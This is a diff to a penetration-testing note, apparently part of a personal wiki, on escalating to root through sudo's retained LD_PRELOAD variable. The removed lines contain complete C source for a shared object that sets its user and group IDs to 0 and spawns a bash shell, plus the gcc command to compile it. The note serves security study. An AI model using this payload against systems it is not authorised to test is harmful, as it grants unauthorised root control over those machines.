@@ -63,28 +63,7 @@ User TCM may run the following commands on this host:
 
 The `env_keep+=LD_PRELOAD` statement is the indicator that running `sudo` retains the environment variable [[LD_PRELOAD]].
 
-2. Stage the malicious shared object file. You can use the following source code for a shell:
-
-```c
-# tgihf.c
-#include <stdio.h>
-#include <sys/types.h>
-#include <stdlib.h>
-
-
-void _init() {
-    unsetenv("LD_PRELOAD");
-    setgid(0);
-    setuid(0);
-    system("/bin/bash");
-}
-```
-
-Compile the source code with the following:
-
-```bash
-gcc -fPIC -shared -o tgihf.so tgihf.c -nostartfiles
-```
+2. Stage a [[so-source|malicious shared object file]].
 
 3. Run one of the current user's allowed `sudo` commands, leveraging [[LD_PRELOAD]] to pre-execute the malcious shared object file.
 
